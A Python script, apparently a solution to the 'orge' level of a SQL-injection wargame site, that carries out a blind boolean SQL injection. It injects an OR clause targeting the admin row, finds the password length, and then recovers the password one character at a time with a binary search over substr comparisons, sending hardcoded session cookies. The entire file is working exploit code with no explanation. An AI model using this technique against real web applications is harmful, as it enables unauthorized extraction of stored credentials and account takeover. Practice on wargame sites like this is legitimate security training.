import requests

def password_length():
	length=0
	while 1:
		length += 1
		query_add = query+"?pw=' || id='admin' %26%26 length(pw)="+str(length)+" --%20"
		result=requests.get(query_add, cookies=cookie)
		#print(result.text.find("Hello"))
		if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
			print("Length is : "+str(length))
			return length

def password(index):
	first=0
	last=255
	while(first<last):
		mid=(first+last)//2
		query_add=query+"?pw=' || id='admin' %26%26 substr(pw,"+str(index)+",1)>=char("+str(mid)+") --%20"
		result=requests.get(query_add, cookies=cookie)
		#print(first, last, result.text.find("Hello"))
		if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
			first=mid
			if(last==first+1):
				query_add=query+"?pw=' || id='admin' %26%26 substr(pw,"+str(index)+",1)=char("+str(first)+") --%20"
				result=requests.get(query_add, cookies=cookie)
				if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
					return first
				else:
					return last
		else:
			last=mid-1

	return first

if(__name__=="__main__"):
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"afuov7bqip2lbk1o06n42o7g45"}
	query='https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php'
	length=password_length()
	for i in range(1, length+1):
		print(chr(password(i)),end="")